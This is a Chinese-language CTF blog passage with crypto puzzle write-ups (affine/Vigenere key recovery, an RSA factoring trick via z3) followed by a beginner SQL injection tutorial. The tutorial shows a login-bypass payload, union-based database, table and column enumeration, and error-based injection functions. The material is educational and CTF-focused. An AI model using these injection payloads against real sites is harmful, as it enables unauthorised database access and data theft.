class="built_in">print</span> best_freq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_of_coincidence</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    计算字符串s的重合指数，即所有字符出现概率的平方和</span></span><br><span class="line"><span class="string">    :param s:密文字符串</span></span><br><span class="line"><span class="string">    :return:s的重合指数</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    zimubiao = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    freq = {}</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">        freq[x] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        freq[x] = freq[x] + <span class="number">1</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">        <span class="comment"># index = index + pow(float(freq[x]) / len(s), 2)</span></span><br><span class="line">       index = index + <span class="built_in">float</span>(freq[x] * (freq[x] - <span class="number">1</span>)) / (<span class="built_in">len</span>(s) * (<span class="built_in">len</span>(s) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_of_coincidence_2</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    计算明文s的拟重合指数，即s中字母的频率与英文字母的统计规律吻合程度</span></span><br><span class="line"><span class="string">    :param s:解出的明文</span></span><br><span class="line"><span class="string">    :return:s的拟重合指数</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    zimubiao = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    freq = {}</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">       freq[x] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        freq[x] = freq[x] + <span class="number">1</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">        index = index + <span class="built_in">float</span>(freq[x]) / <span class="built_in">len</span>(s) * best_freq[x]</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessMN</span>():</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    根据题意，该加密应当会周期使用密钥，该周期是key_a长度和key_k长度的最小公倍数。</span></span><br><span class="line"><span class="string">    遍历周期1到100，分别测试不同周期下各个子密文段的重合指数，然后求平均</span></span><br><span class="line"><span class="string">    :return:无返回值，打印出所有与最佳重合指数相差小于0.01的周期</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        avergage_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">            s = <span class="string">''</span>.join([c[j * l + i] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c) / l)])</span><br><span class="line">            index = index_of_coincidence(s)</span><br><span class="line">            avergage_index += index</span><br><span class="line"></span><br><span class="line">        avergage_index = avergage_index / l - best_index_of_Coincidence</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(avergage_index) &lt; <span class="number">0.01</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">'l='</span>, l</span><br><span class="line">            <span class="built_in">print</span> avergage_index</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">'开始猜测周期'</span></span><br><span class="line"><span class="comment">#guessMN()#结果显示，重合指数得分较高的都是6的整数倍，所以周期极有可能是6</span></span><br><span class="line">l=<span class="number">55</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptChar</span>(<span class="params">c, i, j</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    对单个密文字符解密。</span></span><br><span class="line"><span class="string">    :param c: 单个密文字符</span></span><br><span class="line"><span class="string">    :param i: 与字符c相乘的那个密钥</span></span><br><span class="line"><span class="string">    :param j: 用于位移的密钥</span></span><br><span class="line"><span class="string">    :return: 明文字符</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    i_inv = gm.invert(i, <span class="number">26</span>)</span><br><span class="line">    p = <span class="built_in">chr</span>((<span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">'a'</span>) - j) * i_inv % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'a'</span>))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">s, i, j</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    用固定的i和j，解密子密文段</span></span><br><span class="line"><span class="string">   :param s: 使用相同i和j加密的子密文段</span></span><br><span class="line"><span class="string">    :param i: 与字符c相乘的那个密钥</span></span><br><span class="line"><span class="string">   :param j: 用于位移的密钥</span></span><br><span class="line"><span class="string">    :return: 明文字符串</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    p = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        p += decryptChar(c, i, j)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessKey</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">   对子密文段爆破它所使用的i和j</span></span><br><span class="line"><span class="string">    :param c: 子密文段</span></span><br><span class="line"><span class="string">    :return: 无返回值，但是打印拟重合指数最佳的i和j，即解出的明文统计规律与英文字符统计规律最吻合的i和j</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">13</span>: <span class="comment">#若i与26不互素，则解除的明文不唯一，所以i一定不是2和13的倍数</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            s = decrypt(c, i, j)</span><br><span class="line">            <span class="comment"># print s</span></span><br><span class="line">            index = index_of_coincidence_2(s)</span><br><span class="line">            index = <span class="built_in">abs</span>(index - <span class="number">0.065</span>)</span><br><span class="line">            <span class="keyword">if</span> index &lt; <span class="number">0.01</span>:</span><br><span class="line">                <span class="built_in">print</span> i, j, index</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessAllKeys</span>():</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">   以l为周期，将完整密文c切分成l个子密文段，对这l个子密文段分别爆破其所使用密钥i和j</span></span><br><span class="line"><span class="string">    :return: 无返回值，但打印出最佳的密钥组合</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        s = <span class="string">''</span>.join([c[j * l + i] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c) / l)])</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        guessKey(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">'开始猜测密钥组合'</span></span><br><span class="line"><span class="comment">#guessAllKeys()</span></span><br><span class="line"><span class="comment"># 根据打印结果，发现最佳组合依次是</span></span><br><span class="line"><span class="comment"># 19,10</span></span><br><span class="line"><span class="comment"># 7,9</span></span><br><span class="line"><span class="comment"># 23,3</span></span><br><span class="line"><span class="comment"># 19,24</span></span><br><span class="line"><span class="comment"># 7,14</span></span><br><span class="line"><span class="comment"># 23,15</span></span><br><span class="line"><span class="comment"># 将l设置成12、18、24或更多，还是可以得到这样的组合的重复</span></span><br><span class="line"><span class="comment"># 现在基本可以确定密钥应该是这样的</span></span><br><span class="line">key_a = [<span class="number">23</span>, <span class="number">25</span>, <span class="number">21</span>,<span class="number">3</span>,<span class="number">19</span>]</span><br><span class="line">key_k = [<span class="number">9</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">16</span>,<span class="number">3</span>, <span class="number">22</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用key_a, key_k解密完整的密文，得到明文</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    p += decryptChar(c[i], key_a[i % <span class="number">5</span>], key_k[i % <span class="number">11</span>])</span><br><span class="line"><span class="built_in">print</span> p</span><br><span class="line"><span class="comment">#在最后得到密码frequencyisoeasy</span></span><br></pre></td></tr></table></figure>
<p>Python3解AES：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"frequencyisoeasy"</span></span><br><span class="line">aes = AES.new(key.encode(), AES.MODE_CBC, <span class="string">b'\0'</span> * <span class="number">16</span>)</span><br><span class="line">a = <span class="string">b'XpOY4zBvK6h//jAgIraYzBBK1lXz9pw7DxXGt6XoODZrSUCpjFzgw5pCo3ffclKM'</span></span><br><span class="line">a=base64.b64decode(a)</span><br><span class="line"><span class="built_in">print</span>((aes.decrypt(a)))</span><br></pre></td></tr></table></figure>
<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671531589459-c167f20e-1faf-42c2-bc4e-b2aa66fa763b.png" alt="image-20210509202737039"></p>
<p>其余部分可以参考</p>
<p><a href="http://www.zbc53.top/archives/105/">srtiving写的题目杂记6</a></p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p>题目改编自NUCA的Crypto赛题babycrypto</p>
<p><a href="https://cloud.tencent.com/developer/article/1472511">nuca_crypto_babycrypto_writeup</a></p>
<p><a href="http://www.zbc53.top/archives/105/">srtiving写的题目杂记6</a></p>
<p><a href="https://baike.baidu.com/item/%E9%87%8D%E5%90%88%E6%8C%87%E6%95%B0/1435574?fr=aladdin">重合指数——百度百科</a></p>
<h2 id="ctfshow大牛杯-小二的R54（前半部分）"><a href="#ctfshow大牛杯-小二的R54（前半部分）" class="headerlink" title="ctfshow大牛杯:小二的R54（前半部分）"></a>ctfshow大牛杯:小二的R54（前半部分）</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h3><p>整理下得到：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x, y = [random_prime(<span class="number">2</span> ^ <span class="number">1024</span> - <span class="number">1</span>, <span class="literal">False</span>, <span class="number">2</span> ^ <span class="number">1023</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">n = x * y, </span><br><span class="line">tmp = <span class="built_in">pow</span>(<span class="number">2021</span> * x + <span class="number">501</span> * y, x * y - x - y, x * y), </span><br><span class="line">c = <span class="built_in">pow</span>(flag, <span class="number">0o200001</span>, x * y)</span><br><span class="line"></span><br><span class="line">n=<span class="number">20947495659013288660808536751393787394664606045798093048128257278988208709333248671898749660848208653968668634891579612784633367362177864996602736258460476691940723323282467207875842974409286563660436709535601954405015261428106261369927836045794170912665351432105165546188591486357060490032334793140396757102052999128194027485573053073959574695808224922102635888141991154365047911830780778957642166757152369955362399379720841279167832886144458760347392316082994786119404006382441787685301119197529946566027319295285387108473752590621030421978808950305190250697199878929419723511578437404000924310974770501204226510397</span>, </span><br><span class="line">tmp = <span class="number">12911378830212711575909332427930495830030418987483519620282504671823307660633472092466534392403086505995560725428252134905285658936113891795434303336259751169171583600394870893708505805256284455729584616439559184469715186920464999723861722097244025658190194027561300165723184060071016117033960821040587421503448139025974851980482004179865110864844573575034406782936965166402665401330436229441569042660851847498727291447251591027480750458209012729510702196684303778564353025395186191064801000127420683298000173389589468742142444444759536629401472836827952997758216526858512433131954439154124668711408079361172485321041</span>, </span><br><span class="line">c = <span class="number">13390681135321846035598057088735733735860895610541899486616159864716324918810264721878447895634342127744578566110322466944217562868186608760962032192994397783118528288276520451944892998435079744244578731427626946331165523865930693902700790185275273534104979885060728696532991031786741950704918951536399577118136416956670893081637730646528913282395731901667720418372650030593319596584787752412110672058692368924987360383096340538971725402687347195347344826404005229912821371282465882351660619944919637382790572267512735645269618163597227604601321699186335016345484182059187046972681187078878556533926780789183784240737</span>]</span><br></pre></td></tr></table></figure>
<h3 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">20947495659013288660808536751393787394664606045798093048128257278988208709333248671898749660848208653968668634891579612784633367362177864996602736258460476691940723323282467207875842974409286563660436709535601954405015261428106261369927836045794170912665351432105165546188591486357060490032334793140396757102052999128194027485573053073959574695808224922102635888141991154365047911830780778957642166757152369955362399379720841279167832886144458760347392316082994786119404006382441787685301119197529946566027319295285387108473752590621030421978808950305190250697199878929419723511578437404000924310974770501204226510397</span></span><br><span class="line">tmp=<span class="number">12911378830212711575909332427930495830030418987483519620282504671823307660633472092466534392403086505995560725428252134905285658936113891795434303336259751169171583600394870893708505805256284455729584616439559184469715186920464999723861722097244025658190194027561300165723184060071016117033960821040587421503448139025974851980482004179865110864844573575034406782936965166402665401330436229441569042660851847498727291447251591027480750458209012729510702196684303778564353025395186191064801000127420683298000173389589468742142444444759536629401472836827952997758216526858512433131954439154124668711408079361172485321041</span></span><br><span class="line">c=<span class="number">13390681135321846035598057088735733735860895610541899486616159864716324918810264721878447895634342127744578566110322466944217562868186608760962032192994397783118528288276520451944892998435079744244578731427626946331165523865930693902700790185275273534104979885060728696532991031786741950704918951536399577118136416956670893081637730646528913282395731901667720418372650030593319596584787752412110672058692368924987360383096340538971725402687347195347344826404005229912821371282465882351660619944919637382790572267512735645269618163597227604601321699186335016345484182059187046972681187078878556533926780789183784240737</span></span><br><span class="line"></span><br><span class="line">x=Int(<span class="string">'x'</span>)</span><br><span class="line">y=Int(<span class="string">'y'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(inverse(tmp,n)==<span class="number">2021</span>*x+<span class="number">501</span>*y)</span><br><span class="line">s.add(x*y==n)</span><br><span class="line">s.add(x &gt; <span class="number">1</span>)</span><br><span class="line">s.add(y &gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> s.check()==sat</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'x='</span>,s.model()[x])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'y='</span>,s.model()[y])</span><br><span class="line"></span><br><span class="line">x=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[x]))</span><br><span class="line">y=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[y]))</span><br><span class="line">phi = (x-<span class="number">1</span>)*(y-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,inverse(e,phi),n)))</span><br></pre></td></tr></table></figure>
<h3 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h3><script type="math/tex; mode=display">
a^{\varphi \left( n \right)}\,\,\equiv \,\,1\left( mod\,\,n \right) 
\\
a^{\varphi \left( n \right) -1}\,\,\equiv \,\,tmp\left( mod\,\,n \right) 
\\
a\,\,\cdot \,\,tmp\,\,\equiv \,\,1\left( mod\,\,n \right) 
\\
a\,\,=\,\,tmp^{-1}\,\,mod\,\,n</script><p>后半部分的维吉尼亚还没有解出来。</p>
<p>更新：循环维吉尼亚，密码shosho</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL入门篇</title>
    <url>/2021/04/29/SQL%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    <content><![CDATA[<h1 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h1><p>从零开始学习SQL注入。以下内容从nep冬令营SQL注入讲解视频以及对应课件中整理。</p>
<span id="more"></span>
<h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><h3 id="mysql基础操作"><a href="#mysql基础操作" class="headerlink" title="mysql基础操作"></a>mysql基础操作</h3><p>登录数据库：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
<p>查看库名:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases</span><br></pre></td></tr></table></figure>
<p>创建库、删除库、使用库</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database mrkaixin</span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop database mrkaixin</span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mrkaixin</span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table user(</span><br><span class="line">-&gt; `id` int(<span class="number">11</span>)</span><br><span class="line">-&gt; `name` varchar(<span class="number">255</span>)</span><br><span class="line">-&gt; );</span><br></pre></td></tr></table></figure>
<h3 id="mysql表的一些基本操作-增删查改"><a href="#mysql表的一些基本操作-增删查改" class="headerlink" title="mysql表的一些基本操作(增删查改)"></a>mysql表的一些基本操作(增删查改)</h3><h4 id="Insert"><a href="#Insert" class="headerlink" title="Insert :"></a>Insert :</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mrkaixin <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;nepnep&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mrkaixin <span class="keyword">where</span> xxxx;</span><br></pre></td></tr></table></figure>
<h4 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update mrkaixin <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<h4 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mrkaixin;</span><br></pre></td></tr></table></figure>
<p>备注：<code>*</code>表示输出全部字段。</p>
<h3 id="mysql的常用的变量-函数"><a href="#mysql的常用的变量-函数" class="headerlink" title="mysql的常用的变量(函数)"></a>mysql的常用的变量(函数)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> Database()    <span class="operator">/</span><span class="operator">/</span>查看当前的用户名</span><br><span class="line"><span class="number">2.</span> <span class="keyword">User</span>()        <span class="operator">/</span><span class="operator">/</span>用户</span><br><span class="line"><span class="number">3.</span> Version()     <span class="operator">/</span><span class="operator">/</span>mysql版本</span><br><span class="line"><span class="number">4.</span> @<span class="variable">@basedir</span>     <span class="operator">/</span><span class="operator">/</span>安装路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="mysql中的常用的符号"><a href="#mysql中的常用的符号" class="headerlink" title="mysql中的常用的符号"></a>mysql中的常用的符号</h3><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. &amp;   and</span><br><span class="line">2. ||  or</span><br><span class="line">3. ^   xor</span><br></pre></td></tr></table></figure>
<p>mysql中常用的函数</p>
<h4 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Substr(database(),1,1)</span><br><span class="line">Subtring</span><br><span class="line">Mid(database(),1,1)</span><br><span class="line">Left(database(),1)</span><br></pre></td></tr></table></figure>
<h4 id="编码函数"><a href="#编码函数" class="headerlink" title="编码函数"></a>编码函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ascii()</span><br><span class="line">Hex()</span><br><span class="line">Char()      &#x2F;&#x2F;ascii()的逆函数</span><br></pre></td></tr></table></figure>
<h4 id="文件函数"><a href="#文件函数" class="headerlink" title="文件函数"></a>文件函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Load_file()   &#x2F;&#x2F;读取文件内容</span><br></pre></td></tr></table></figure>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入起手式"><a href="#SQL注入起手式" class="headerlink" title="SQL注入起手式"></a>SQL注入起手式</h3><h4 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h4><p>常见的注释符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. #(%23)</span><br><span class="line">2. --+</span><br><span class="line">3. ;%00</span><br><span class="line">4. &#96;</span><br></pre></td></tr></table></figure>
<p>思考:</p>
<p>如果在CTF中，把常用的注释符，以及单引号都按了，那么又该怎么闭合呢？</p>
<p>这里我们通过使用在<code>&quot;\&quot;</code>来将<code>$username</code>后面的单引号转义。然后我们想办法在<code>$password</code>部分注释掉后面的单引号。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> data <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;\&#x27;</span><span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27; or 1=1 ;%00&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>第二个单引号被\转义了。第一个和第三个单引号之间的值为username的值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="keyword">or</span>后面是输入的password的值，;<span class="operator">%</span><span class="number">00</span>可以用来闭合后面的单引号。</span><br></pre></td></tr></table></figure>
<h3 id="SQL注入的常见姿势"><a href="#SQL注入的常见姿势" class="headerlink" title="SQL注入的常见姿势"></a>SQL注入的常见姿势</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><h5 id="联合查询的基本要求："><a href="#联合查询的基本要求：" class="headerlink" title="联合查询的基本要求："></a>联合查询的基本要求：</h5><p>1、查询列数必须一致</p>
<p>2、查询语句的查询的各列类型、顺序最好一致</p>
<h5 id="联合查询的步骤"><a href="#联合查询的步骤" class="headerlink" title="联合查询的步骤"></a>联合查询的步骤</h5><p>1、闭合</p>
<p>2、判断字段数</p>
<h5 id="注意：order-by操作"><a href="#注意：order-by操作" class="headerlink" title="注意：order by操作"></a>注意：order by操作</h5><p>Order by : 如果后面接的是整形的话，根据第几个字段进行排序。</p>
<h5 id="简单介绍一下SQL-union操作符"><a href="#简单介绍一下SQL-union操作符" class="headerlink" title="简单介绍一下SQL union操作符"></a>简单介绍一下SQL union操作符</h5><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
<p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p>
<p> SQL UNION语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
<p> SQL UNION ALL 语法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531635590-13ce7f0b-c056-4ee1-bd27-28328161a19b.png" alt="image-20210501122431780"></p>
<h5 id="判断结果输出位置"><a href="#判断结果输出位置" class="headerlink" title="判断结果输出位置"></a>判断结果输出位置</h5><p>这里我们可以看到，如果是1的话，如果数据库中是存在id = 1 ，那么就会返回两行数据，但是由于limit 0,1 。Mysql总会返回第一条数据。所以自然是返回原来查询的，所以这里我们id = -1 或者其他不存在的列，那么第一行就一定是我们自己控制的了。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531641479-36a496d8-7184-4373-b299-74b40a705aca.png" alt="image-20210504121547474"></p>
<h5 id="爆库、爆表、爆列"><a href="#爆库、爆表、爆列" class="headerlink" title="爆库、爆表、爆列"></a>爆库、爆表、爆列</h5><p>讲爆X之前，我们先来认识一下information_schema这一个数据库<br>这个库中我们先来看看这两个表</p>
<blockquote>
<p>TABLE表 :提供了关于数据库中的表的信息（包括视图）<br>COLUMNS表:提供了表中的列信息。</p>
</blockquote>
<p>爆破库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br></pre></td></tr></table></figure>
<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(table_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
<p>爆Column名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
<p>表名列名都有了之后，我们便可以通过，自由构造语句来获取获取每一个表中的信息了。</p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在没法使用union联合查询时使用，前提是不能过滤一些关键函数。</p>
<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
<p>路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容</p>
<h5 id="报错注入常用到的函数"><a href="#报错注入常用到的函数" class="headerlink" title="报错注入常用到的函数"></a>报错注入常用到的函数</h5><p>Updatexml:更新xml文档的函数。<br>       语法：updatexml(文档类型，xpath路径，更新的内容)</p>
<p>Extractvalue:对XML文档进行查询的函数<br>       语法： extractvalue(文档类型，xpath路径)</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531649297-4c5226f0-2574-4d04-8458-dcf3aad2e27a.png" alt="image-20210509115330629"></p>
<h5 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h5><p>报错注入有长度限制，不同的函数限制不一样。只能截32位。</p>
<p>如果超过32位，可以分开截，先截32，再截32 。</p>
<p>或者从后往前反着截。</p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p><img src="https://c.img.dasctf.com/images/20221220/1671531666330-af309926-095f-45cb-8dd5-dddc24f38173.png" alt="image-20210509120057993"></p>
